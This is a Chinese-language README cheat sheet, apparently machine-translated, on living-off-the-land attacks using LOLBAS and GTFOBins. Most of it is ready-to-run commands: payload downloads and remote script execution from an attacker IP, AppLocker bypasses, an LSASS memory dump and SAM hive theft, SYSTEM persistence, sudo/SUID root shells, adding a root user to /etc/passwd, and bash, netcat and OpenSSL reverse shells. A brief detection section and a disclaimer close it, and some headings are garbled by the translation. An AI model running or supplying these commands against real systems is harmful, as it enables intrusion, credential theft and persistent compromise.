<!-- language-home-navigation -->
[🏠 中文主页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🏹 靠土地生活（LOLBAS 和 GTFOBins）- 完整备忘单

[🇹🇷 Türkçe Sürüm]（翻译/README.tr.md）
```
  ██╗      ██████╗ ██╗     ██████╗  █████╗ ███████╗    ██████╗ ████████╗███████╗ ██████╗ 
  ██║     ██╔═══██╗██║     ██╔══██╗██╔══██╗██╔════╝   ██╔════╝ ╚══██╔══╝██╔════╝██╔═══██╗
  ██║     ██║   ██║██║     ██████╔╝███████║███████╗   ██║  ███╗   ██║   █████╗  ██║   ██║
  ██║     ██║   ██║██║     ██╔══██╗██╔══██║╚════██║   ██║   ██║   ██║   ██╔══╝  ██║   ██║
  ███████╗╚██████╔╝███████╗██████╔╝██║  ██║███████║██╗╚██████╔╝   ██║   ██║     ╚██████╔╝
  ╚══════╝ ╚═════╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝    ╚═╝   ╚═╝      ╚═════╝ 
                 Living Off The Land (Windows LOLBAS & Unix GTFOBins)
```
<p对齐=“中心”>
  <img src="https://img.shields.io/badge/LOLBAS-Windows_Binaries-blue?style=for-the-badge" alt="LOLBAS">
  <img src="https://img.shields.io/badge/GTFOBins-Unix_PrivEsc-orange?style=for-the-badge" alt="GTFOBins">
  <img src="https://img.shields.io/badge/Defense_Evasion-Fileless-red?style=for-the-badge" alt="防御规避">
  <img src="https://img.shields.io/badge/Living_Off_The_Land-Techniques-green?style=for-the-badge" alt="靠土地为生">
</p>

<p对齐=“中心”>
  <b>🛠️滥用合法预装系统二进制文件执行代码、下载有效负载和升级权限的综合参考</b>
</p>

---

## 📋 目录

- [简介](#-简介)
- [为什么要靠土地生活？](#-why-living-off-the land)
- [第 1 部分：Windows LOLBAS](#-part-1-windows-lolbas)
  - [文件下载和入口](#file-download--ingress)
  - [代码执行和AppLocker绕过](#code-execution--applocker-bypass)
  - [凭证转储（LSASS、SAM、LSA）](#credential-dumping-lsass-sam-lsa)
  - [侦察与发现](#reconnaissance--discovery)
  - [持久化和计划任务](#persistence--scheduled-tasks)
- [第 2 部分：Unix / Linux GTFOBins](#-part-2-unix--linux-gtfobins)
  - [SUID 和 Sudo Shell 转义](#suid--sudo-shell-escapes)
  - [文件读写利用](#file-read--write-exploitation)
  - [网络入口和反向 Shell](#network-ingress--reverse-shells)
  - [GTFOBins 高影响力口译员](#gtfobins-high-impact-interpreters)
- [快速参考表](#-quick-reference-table)
- [防守考虑与检测](#-defective-considerations--detection)
- [法律免责声明](#-legal-disclaimer)
- [资源](#-资源)

---

## 🎯 简介

**Living Off The Land (LotL)** 是一种后利用技术，攻击者和红队成员专门使用操作系统上已有的合法、内置、受信任的系统二进制文件、脚本和库。

- **LOLBAS (Windows)：** 依赖二进制文件、脚本和库。
- **GTFOBins (Unix/Linux)：** Unix 二进制文件的精选集合，可被滥用以绕过本地安全限制、逃避受限 shell 和升级权限。

---

## ⚖️ 为什么靠土地为生？

1. 🛡️ **绕过应用程序白名单：** `certutil.exe`、`rundll32.exe` 或 `find` 等二进制文件由 Microsoft 或操作系统供应商进行数字签名，并受到 AppLocker、WDAC 和 SELinux 的信任。
2. 👁️ **规避基于签名的 AV/EDR：** 不会将外部恶意可执行文件（`.exe`、`.elf`）投放到磁盘上。
3. 📉 **低运营占用空间：** 通过利用本机管理工具减少日志取证异常。

---

## 🪟 第 1 部分：Windows LOLBAS

### 文件下载和入口

#### 1.Certutil.exe
```cmd
:: Download file and decode from base64
certutil.exe -urlcache -split -f http://10.10.14.5/shell.exe %TEMP%\shell.exe

:: Base64 encode and decode local files
certutil.exe -encode payload.exe encoded.txt
certutil.exe -decode encoded.txt payload.exe
```
#### 2.Bitsadmin.exe
```cmd
:: Asynchronous background download
bitsadmin.exe /transfer myDownloadJob /download /priority FOREGROUND http://10.10.14.5/payload.exe C:\Windows\Temp\payload.exe
```
#### 3.Curl.exe 和 PowerShell
```powershell
:: Built-in curl (Windows 10+)
curl.exe -o C:\Windows\Temp\tool.exe http://10.10.14.5/tool.exe

:: PowerShell download string
powershell -nop -c "Invoke-WebRequest -Uri 'http://10.10.14.5/s.ps1' -OutFile '$env:TEMP\s.ps1'"
```
---

### 代码执行和AppLocker绕过

#### 1. Mshta.exe（执行远程 HTA/VBScript）
```cmd
:: Execute malicious HTA script directly from remote URL (bypasses AppLocker)
mshta.exe http://10.10.14.5/payload.hta

:: Inline VBScript execution
mshta.exe vbscript:Close(Execute("CreateObject(""WScript.Shell"").Run ""cmd.exe /c calc.exe"""))
```
#### 2.Regsvr32.exe（Squouslydoo 技术）
```cmd
:: Executes remote scriptlet (.sct) via COM without touching disk
regsvr32.exe /s /n /u /i:http://10.10.14.5/shell.sct scrobj.dll
```
#### 3.Rundll32.exe
```cmd
:: Execute exported DLL function
rundll32.exe payload.dll,EntryPoint

:: Execute JavaScript in memory
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('Pwned');
```
#### 4.Wmic.exe（XSL脚本执行）
```cmd
:: Execute arbitrary code via XSL stylesheet
wmic.exe process get brief /format:"http://10.10.14.5/script.xsl"
```
#### 5.Installutil.exe
```cmd
:: Execute unmanaged code inside signed .NET installer (bypasses AppLocker)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U MaliciousApp.exe
```
---

### 凭证转储（LSASS、SAM、LSA）

#### 1. Rundll32.exe + Comsvcs.dll（LSASS 转储）
转储 LSASS 进程内存而不删除 Mimikatz：
```powershell
# Find LSASS Process ID
$lsassPid = (Get-Process lsass).Id

# Create minidump using built-in comsvcs.dll (Requires Administrator)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid C:\Windows\Temp\lsass.dmp full
```
#### 2. Reg.exe（保存 SAM、SYSTEM 和 SECURITY Hive）
```cmd
:: Dump local credential hives for offline extraction
reg.exe save HKLM\SAM C:\Windows\Temp\sam.hive
reg.exe save HKLM\SYSTEM C:\Windows\Temp\system.hive
reg.exe save HKLM\SECURITY C:\Windows\Temp\security.hive
```
---

### 侦察与发现
```cmd
:: Find internal domain controllers
nltest /dclist:domain.local

:: List domain trust relationships
nltest /domain_trusts

:: Query Active Directory computers and users without RSAT
dsquery computer
dsquery user -name *admin*

:: Check active network connections with process IDs
netstat -ano
```
---

### 持久性和计划任务
```cmd
:: Create scheduled task running every 15 minutes as SYSTEM
schtasks.exe /create /tn "SecurityHealthService" /tr "C:\Windows\Temp\agent.exe" /sc minute /mo 15 /ru "NT AUTHORITY\SYSTEM"

:: Add Registry Run Key for current user
reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\Windows\Temp\shell.exe" /f
```
---

## 🐧 第 2 部分：Unix / Linux GTFOBins

### SUID 和 Sudo Shell 转义

当二进制文件设置了 SUID (`chmod u+s`) 或在 `sudo -l` 中被授予时，将其滥用为直接 root shell：

#### 1.须藤/SUID `find`
```bash
# SUID
find . -exec /bin/sh -p \; -quit

# Sudo
sudo find . -exec /bin/sh \; -quit
```
#### 2. 须藤 / SUID `vim` / `vi`
```bash
# Escape from inside vim
:!/bin/sh

# One-liner execution
vim -c ':!/bin/sh'
```
#### 3.须藤/SUID `awk`
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```
#### 4.须藤/SUID `tar`
```bash
# Checkpoint command execution
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
#### 5.须藤/SUID `nano`
```bash
# Inside nano: Press Ctrl+R, then Ctrl+X, then type:
reset; sh 1>&0 2>&0
```
#### 6.须藤/SUID `env`
```bash
# SUID
env /bin/sh -p

# Sudo
sudo env /bin/sh
```
#### 7.须藤`less` / `more` / `man`
```bash
# Inside pager: Type !/bin/sh and press Enter
!/bin/sh
```
---

### 文件读写利用

当您无法直接生成 shell 时，请使用文件读/写实用程序覆盖 `/etc/passwd` 或读取 `/etc/shadow`：

#### 通过 Sudo/SUID `tee` 覆盖 `/etc/passwd`
```bash
# Generate password hash: openssl passwd -1 -salt evil P@ss123
echo 'root2:$1$evil$TNy7V...:0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd
su root2
```
#### 通过 SUID 二进制文件读取敏感文件
```bash
# Base64
base64 /etc/shadow | base64 --decode

# Xxd
xxd /etc/shadow | xxd -r

# Head / Tail
head -n 100 /etc/shadow
```
---

### 网络入口和反向 Shell

无需 `curl` 或 `wget` 即可传输文件并弹出 shell：

#### 1. Bash Native TCP 反向 Shell
```bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```
#### 2. 原生 Netcat（无 `-e` 标志）
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f
```
#### 3.OpenSSL加密反向Shell
关于攻击者：
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
```
瞄准目标：
```bash
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.14.5:4444 > /tmp/s; rm /tmp/s
```
---

### GTFOBins 高影响力口译员

如果解释器被授予 Sudo / SUID：
```bash
# Python
sudo python3 -c 'import os; os.system("/bin/sh")'

# Perl
sudo perl -e 'exec "/bin/sh";'

# Ruby
sudo ruby -e 'exec "/bin/sh"'

# PHP
sudo php -r "system('/bin/sh');"

# Lua
sudo lua -e 'os.execute("/bin/sh")'
```
---

## 📊 快速参考表

|操作系统 |二进制 |目的|滥用命令 |
|----|--------|---------|----------------|
| **获胜** | `certutil.exe` |下载文件 | `certutil -urlcache -split -f http://<IP>/file out.exe` |
| **获胜** | `mshta.exe` |远程 HTA 执行 | `mshta http://<IP>/payload.hta` |
| **获胜** | `regsvr32.exe` | Scriptlet 执行 | `regsvr32 /s /n /u /i:http://<IP>/s.sct scrobj.dll` |
| **获胜** | `rundll32.exe` | LSASS 转储 | `rundll32 comsvcs.dll, MiniDump <PID> out.dmp full` |
| **Unix**| `find` | SUID 外壳 | `find . -exec /bin/sh -p \; -quit` |
| **Unix**| `awk`|须藤壳 | `sudo awk 'BEGIN {system("/bin/sh")}'`|
| **Unix**| `vim` |外壳逃脱 | `vim -c ':!/bin/sh'` |
| **Unix**| `tee` |文件覆盖 | `echo "root2:..." \| sudo tee -a /etc/passwd`|

---

## 🛡️ 防守考虑和检测

1. **审核命令行日志记录：**
   通过命令行审核启用 **Sysmon（事件 ID 1）** 和 Windows 进程创建日志记录（事件 ID 4688），以监视传递到 `certutil`、`mshta` 和 `rundll32` 的异常参数。
2. **阻止恶意亲子关系：**
   监视 `mshta.exe` 或 `regsvr32.exe` 生成 `cmd.exe` 或 `powershell.exe`。
3. **限制 Sudo 指令：**
   避免在 `/etc/sudoers` 中使用通配符 (`*`)。切勿允许用户以 root 身份运行文本编辑器（`vim`、`nano`）或编译器。

---

## ⚠️ 法律免责声明

> **重要：** 离地生活技术滥用了受信任的管理实用程序。本备忘单严格用于授权的安全评估、防御强化和教育研究。

---

## 📚 资源

- [LOLBAS项目官方仓库](https://lolbas-project.github.io/)
- [GTFOBins 官方存储库](https://gtfobins.github.io/)
- [MITRE ATT&CK：颠覆信任控制 (T1564)](https://attack.mitre.org/techniques/T1564/)